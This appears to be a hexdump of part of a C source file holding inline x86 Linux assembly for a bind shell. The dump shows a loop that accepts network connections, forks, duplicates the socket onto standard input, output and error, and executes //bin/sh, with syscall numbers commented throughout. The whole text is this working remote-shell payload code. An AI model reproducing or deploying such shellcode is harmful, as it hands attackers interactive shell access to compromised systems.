000012c0  20 20 20 20 20 20 20 20  20 20 20 20 20 23 20 53  |             # S|
000012d0  49 47 5f 49 47 4e 0d 0a  20 20 20 20 20 20 20 20  |IG_IGN..        |
000012e0  20 20 20 20 20 20 20 20  6d 6f 76 62 20 20 20 20  |        movb    |
000012f0  24 34 38 2c 20 20 20 20  25 61 6c 20 20 20 20 20  |$48,    %al     |
00001300  20 20 20 20 20 20 20 20  23 20 53 59 53 5f 73 69  |        # SYS_si|
00001310  67 6e 61 6c 0d 0a 20 20  20 20 20 20 20 20 20 20  |gnal..          |
00001320  20 20 20 20 20 20 69 6e  74 20 20 20 20 20 24 30  |      int     $0|
00001330  78 38 30 0d 0a 0d 0a 20  20 20 20 20 20 20 20 20  |x80....         |
00001340  20 20 20 20 20 20 20 23  20 77 68 69 6c 65 28 31  |       # while(1|
00001350  29 3b 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |);..            |
00001360  20 20 20 20 57 48 49 4c  45 3a 0d 0a 20 20 20 20  |    WHILE:..    |
00001370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001380  20 20 20 20 23 20 6e 65  77 5f 73 6f 63 6b 20 3d  |    # new_sock =|
00001390  20 61 63 63 65 70 74 28  73 6f 63 6b 2c 20 30 2c  | accept(sock, 0,|
000013a0  20 30 29 3b 0d 0a 20 20  20 20 20 20 20 20 20 20  | 0);..          |
000013b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
000013c0  72 6c 20 20 20 20 25 65  61 78 2c 20 20 20 25 65  |rl    %eax,   %e|
000013d0  61 78 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ax..            |
000013e0  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 6c  |            xorl|
000013f0  20 20 20 20 25 65 62 78  2c 20 20 20 25 65 62 78  |    %ebx,   %ebx|
00001400  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001410  20 20 20 20 20 20 20 20  20 20 70 75 73 68 6c 20  |          pushl |
00001420  20 20 25 65 61 78 0d 0a  20 20 20 20 20 20 20 20  |  %eax..        |
00001430  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001440  70 75 73 68 6c 20 20 20  25 65 61 78 0d 0a 20 20  |pushl   %eax..  |
00001450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001460  20 20 20 20 20 20 70 75  73 68 6c 20 20 20 25 65  |      pushl   %e|
00001470  64 69 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |di              |
00001480  20 20 20 20 20 20 23 20  73 6f 63 6b 0d 0a 20 20  |      # sock..  |
00001490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000014a0  20 20 20 20 20 20 6d 6f  76 6c 20 20 20 20 25 65  |      movl    %e|
000014b0  73 70 2c 20 20 20 25 65  63 78 0d 0a 20 20 20 20  |sp,   %ecx..    |
000014c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000014d0  20 20 20 20 6d 6f 76 62  20 20 20 20 24 35 2c 20  |    movb    $5, |
000014e0  20 20 20 20 25 62 6c 20  20 20 20 20 20 20 20 20  |    %bl         |
000014f0  20 20 20 20 23 20 53 59  53 5f 41 43 43 45 50 54  |    # SYS_ACCEPT|
00001500  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001510  20 20 20 20 20 20 20 20  20 20 6d 6f 76 62 20 20  |          movb  |
00001520  20 20 24 31 30 32 2c 20  20 20 25 61 6c 20 20 20  |  $102,   %al   |
00001530  20 20 20 20 20 20 20 20  20 20 23 20 53 59 53 5f  |          # SYS_|
00001540  73 6f 63 6b 65 74 63 61  6c 6c 0d 0a 20 20 20 20  |socketcall..    |
00001550  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001560  20 20 20 20 69 6e 74 20  20 20 20 20 24 30 78 38  |    int     $0x8|
00001570  30 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |0..             |
00001580  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 6c 20  |           movl |
00001590  20 20 20 25 65 61 78 2c  20 20 20 25 65 73 69 20  |   %eax,   %esi |
000015a0  20 20 20 20 20 20 20 20  20 20 20 23 20 6e 65 77  |           # new|
000015b0  5f 73 6f 63 6b 0d 0a 0d  0a 20 20 20 20 20 20 20  |_sock....       |
000015c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000015d0  20 23 20 69 66 20 28 66  6f 72 6b 28 29 20 3d 3d  | # if (fork() ==|
000015e0  20 30 29 20 7b 0d 0a 0d  0a 20 20 20 20 20 20 20  | 0) {....       |
000015f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001600  20 78 6f 72 6c 20 20 20  20 25 65 61 78 2c 20 20  | xorl    %eax,  |
00001610  20 25 65 61 78 0d 0a 20  20 20 20 20 20 20 20 20  | %eax..         |
00001620  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
00001630  6f 72 6c 20 20 20 20 25  65 62 78 2c 20 20 20 25  |orl    %ebx,   %|
00001640  65 62 78 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |ebx..           |
00001650  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00001660  62 20 20 20 20 24 32 2c  20 20 20 20 20 25 61 6c  |b    $2,     %al|
00001670  20 20 20 20 20 20 20 20  20 20 20 20 20 23 20 53  |             # S|
00001680  59 53 5f 66 6f 72 6b 0d  0a 20 20 20 20 20 20 20  |YS_fork..       |
00001690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000016a0  20 69 6e 74 20 20 20 20  20 24 30 78 38 30 0d 0a  | int     $0x80..|
000016b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000016c0  20 20 20 20 20 20 20 20  63 6d 70 6c 20 20 20 20  |        cmpl    |
000016d0  25 65 61 78 2c 20 20 20  25 65 62 78 0d 0a 20 20  |%eax,   %ebx..  |
000016e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000016f0  20 20 20 20 20 20 6a 6e  65 20 43 4c 4f 53 45 5f  |      jne CLOSE_|
00001700  4e 45 57 53 4f 43 4b 0d  0a 0d 0a 20 20 20 20 20  |NEWSOCK....     |
00001710  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001720  20 20 20 20 20 20 20 20  20 20 20 23 20 63 6c 6f  |           # clo|
00001730  73 65 28 73 6f 63 6b 29  3b 0d 0a 20 20 20 20 20  |se(sock);..     |
00001740  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001750  20 20 20 20 20 20 20 20  20 20 20 78 6f 72 6c 20  |           xorl |
00001760  20 20 20 25 65 61 78 2c  20 20 20 25 65 61 78 0d  |   %eax,   %eax.|
00001770  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001780  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001790  20 6d 6f 76 6c 20 20 20  20 25 65 64 69 2c 20 20  | movl    %edi,  |
000017a0  20 25 65 62 78 20 20 20  20 23 20 73 6f 63 6b 0d  | %ebx    # sock.|
000017b0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000017c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000017d0  20 6d 6f 76 62 20 20 20  20 24 36 2c 20 20 20 20  | movb    $6,    |
000017e0  20 25 61 6c 20 20 20 20  20 23 20 53 59 53 5f 63  | %al     # SYS_c|
000017f0  6c 6f 73 65 0d 0a 20 20  20 20 20 20 20 20 20 20  |lose..          |
00001800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001810  20 20 20 20 20 20 69 6e  74 20 24 30 78 38 30 0d  |      int $0x80.|
00001820  0a 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |...             |
00001830  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001840  20 20 20 23 20 64 75 70  32 28 6e 65 77 5f 73 6f  |   # dup2(new_so|
00001850  63 6b 2c 20 30 29 3b 0d  0a 20 20 20 20 20 20 20  |ck, 0);..       |
00001860  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001870  20 20 20 20 20 20 20 20  20 78 6f 72 6c 20 20 20  |         xorl   |
00001880  20 25 65 61 78 2c 20 20  20 25 65 61 78 0d 0a 20  | %eax,   %eax.. |
00001890  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000018a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
000018b0  6f 72 6c 20 20 20 20 25  65 63 78 2c 20 20 20 25  |orl    %ecx,   %|
000018c0  65 63 78 20 20 20 20 23  20 73 74 64 69 6e 0d 0a  |ecx    # stdin..|
000018d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000018f0  6d 6f 76 6c 20 20 20 20  25 65 73 69 2c 20 20 20  |movl    %esi,   |
00001900  25 65 62 78 20 20 20 20  23 20 6e 65 77 5f 73 6f  |%ebx    # new_so|
00001910  63 6b 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ck..            |
00001920  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001930  20 20 20 20 6d 6f 76 62  20 20 20 20 24 36 33 2c  |    movb    $63,|
00001940  20 20 20 20 25 61 6c 20  20 20 20 20 23 20 53 59  |    %al     # SY|
00001950  53 5f 64 75 70 32 0d 0a  20 20 20 20 20 20 20 20  |S_dup2..        |
00001960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001970  20 20 20 20 20 20 20 20  69 6e 74 20 20 20 20 20  |        int     |
00001980  24 30 78 38 30 0d 0a 0d  0a 20 20 20 20 20 20 20  |$0x80....       |
00001990  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000019a0  20 20 20 20 20 20 20 20  20 23 20 64 75 70 32 28  |         # dup2(|
000019b0  6e 65 77 5f 73 6f 63 6b  2c 20 31 29 3b 0d 0a 20  |new_sock, 1);.. |
000019c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000019d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
000019e0  6f 72 6c 20 20 20 20 25  65 61 78 2c 20 20 20 25  |orl    %eax,   %|
000019f0  65 61 78 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |eax..           |
00001a00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001a10  20 20 20 20 20 69 6e 63  6c 20 20 20 20 25 65 63  |     incl    %ec|
00001a20  78 20 20 20 20 20 20 20  20 20 20 20 20 23 20 73  |x            # s|
00001a30  74 64 6f 75 74 0d 0a 20  20 20 20 20 20 20 20 20  |tdout..         |
00001a40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001a50  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 20 24  |       movb    $|
00001a60  36 33 2c 20 20 20 20 25  61 6c 20 20 20 20 20 23  |63,    %al     #|
00001a70  20 53 59 53 5f 64 75 70  32 0d 0a 20 20 20 20 20  | SYS_dup2..     |
00001a80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001a90  20 20 20 20 20 20 20 20  20 20 20 69 6e 74 20 20  |           int  |
00001aa0  20 20 20 24 30 78 38 30  0d 0a 0d 0a 20 20 20 20  |   $0x80....    |
00001ab0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001ac0  20 20 20 20 20 20 20 20  20 20 20 20 23 20 64 75  |            # du|
00001ad0  70 32 28 6e 65 77 5f 73  6f 63 6b 2c 20 33 29 3b  |p2(new_sock, 3);|
00001ae0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001af0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001b00  20 20 78 6f 72 6c 20 20  20 20 25 65 61 78 2c 20  |  xorl    %eax, |
00001b10  20 20 25 65 61 78 0d 0a  20 20 20 20 20 20 20 20  |  %eax..        |
00001b20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001b30  20 20 20 20 20 20 20 20  69 6e 63 6c 20 20 20 20  |        incl    |
00001b40  25 65 63 78 20 20 20 20  20 20 20 20 20 20 20 20  |%ecx            |
00001b50  23 20 73 74 64 65 72 72  0d 0a 20 20 20 20 20 20  |# stderr..      |
00001b60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001b70  20 20 20 20 20 20 20 20  20 20 6d 6f 76 62 20 20  |          movb  |
00001b80  20 20 24 36 33 2c 20 20  20 20 25 61 6c 20 20 20  |  $63,    %al   |
00001b90  20 20 23 20 53 59 53 5f  64 75 70 32 0d 0a 20 20  |  # SYS_dup2..  |
00001ba0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001bb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00001bc0  74 20 20 20 20 20 24 30  78 38 30 0d 0a 0d 0a 20  |t     $0x80.... |
00001bd0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001be0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |               #|
00001bf0  20 65 78 65 63 76 65 28  61 72 67 76 5b 30 5d 2c  | execve(argv[0],|
00001c00  20 26 61 72 67 76 5b 30  5d 2c 20 4e 55 4c 4c 29  | &argv[0], NULL)|
00001c10  3b 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |;..             |
00001c20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001c30  20 20 20 78 6f 72 6c 20  20 20 20 25 65 61 78 2c  |   xorl    %eax,|
00001c40  20 20 20 25 65 61 78 0d  0a 20 20 20 20 20 20 20  |   %eax..       |
00001c50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001c60  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
00001c70  20 25 65 61 78 0d 0a 20  20 20 20 20 20 20 20 20  | %eax..         |
00001c80  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001c90  20 20 20 20 20 20 20 70  75 73 68 6c 20 20 20 24  |       pushl   $|
00001ca0  30 78 36 38 37 33 32 66  32 66 0d 0a 20 20 20 20  |0x68732f2f..    |
00001cb0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001cc0  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00001cd0  6c 20 20 20 24 30 78 36  65 36 39 36 32 32 66 0d  |l   $0x6e69622f.|
00001ce0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001cf0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001d00  20 6d 6f 76 6c 20 20 20  20 25 65 73 70 2c 20 20  | movl    %esp,  |
00001d10  20 25 65 62 78 20 20 20  20 23 20 2f 2f 62 69 6e  | %ebx    # //bin|
00001d20  2f 73 68 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |/sh..           |
00001d30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001d40  20 20 20 20 20 6d 6f 76  6c 20 20 20 20 38 28 25  |     movl    8(%|
00001d50  65 73 70 29 2c 25 65 64  78 0d 0a 20 20 20 20 20  |esp),%edx..     |
00001d60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001d70  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 6c  |           pushl|
00001d80  20 20 20 25 65 61 78 0d  0a 20 20 20 20 20 20 20  |   %eax..       |
00001d90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001da0  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
00001db0  20 25 65 62 78 0d 0a 20  20 20 20 20 20 20 20 20  | %ebx..         |
00001dc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001dd0  20 20 20 20 20 20 20 6d  6f 76 6c 20 20 20 20 25  |       movl    %|
00001de0  65 73 70 2c 20 20 20 25  65 63 78 0d 0a 20 20 20  |esp,   %ecx..   |
00001df0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e00  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00001e10  62 20 20 20 20 24 30 78  62 2c 20 20 20 25 61 6c  |b    $0xb,   %al|
00001e20  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001e30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e40  20 20 69 6e 74 20 20 20  20 20 24 30 78 38 30 20  |  int     $0x80 |
00001e50  20 20 20 20 20 20 20 20  20 20 23 20 53 59 53 5f  |          # SYS_|
00001e60  65 78 65 63 76 65 0d 0a  0d 0a 20 20 20 20 20 20  |execve....      |
00001e70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e80  20 20 20 20 20 20 20 20  20 20 23 20 65 78 69 74  |          # exit|
00001e90  28 29 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |()..            |
00001ea0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001eb0  20 20 20 20 78 6f 72 6c  20 20 20 20 25 65 61 78  |    xorl    %eax|
00001ec0  2c 20 20 20 25 65 61 78  0d 0a 20 20 20 20 20 20  |,   %eax..      |
00001ed0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001ee0  20 20 20 20 20 20 20 20  20 20 69 6e 63 6c 20 20  |          incl  |
00001ef0  20 20 25 65 61 78 20 20  20 20 20 20 20 20 20 20  |  %eax          |
00001f00  20 20 23 20 53 59 53 5f  65 78 69 74 0d 0a 20 20  |  # SYS_exit..  |
00001f10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001f20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 69 6e  |              in|
00001f30  74 20 20 20 20 20 24 30  78 38 30 0d 0a 20 20 20  |t     $0x80..   |
00001f40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001f50  20 20 20 20 20 43 4c 4f  53 45 5f 4e 45 57 53 4f  |     CLOSE_NEWSO|
00001f60  43 4b 3a 0d 0a 0d 0a 20  20 20 20 20 20 20 20 20  |CK:....         |
00001f70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 23  |               #|
00001f80  20 63 6c 6f 73 65 28 6e  65 77 73 6f 63 6b 29 3b  | close(newsock);|
00001f90  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001fa0  20 20 20 20 20 20 20 20  20 20 78 6f 72 6c 20 20  |          xorl  |
00001fb0  20 20 25 65 61 78 2c 20  20 20 25 65 61 78 0d 0a  |  %eax,   %eax..|
00001fc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001fd0  20 20 20 20 20 20 20 20  6d 6f 76 6c 20 20 20 20  |        movl    |
00001fe0  25 65 73 69 2c 20 20 20  25 65 62 78 20 20 20 20  |%esi,   %ebx    |
00001ff0  23 20 6e 65 77 73 6f 63  6b 0d 0a 20 20 20 20 20  |# newsock..     |
00002000  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002010  20 20 20 6d 6f 76 62 20  20 20 20 24 36 2c 20 20  |   movb    $6,  |
00002020  20 20 20 25 61 6c 20 20  20 20 20 23 20 53 59 53  |   %al     # SYS|
00002030  5f 63 6c 6f 73 65 0d 0a  20 20 20 20 20 20 20 20  |_close..        |
00002040  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002050  69 6e 74 20 24 30 78 38  30 0d 0a 0d 0a 20 20 20  |int $0x80....   |
00002060  20 20 20 20 20 20 20 20  20 20 20 20 20 6a 6d 70  |             jmp|
00002070  20 57 48 49 4c 45 20 22  29 3b 0d 0a 0d 0a 0d 0a  | WHILE ");......|
00002080  7d                                                |}|
00002081
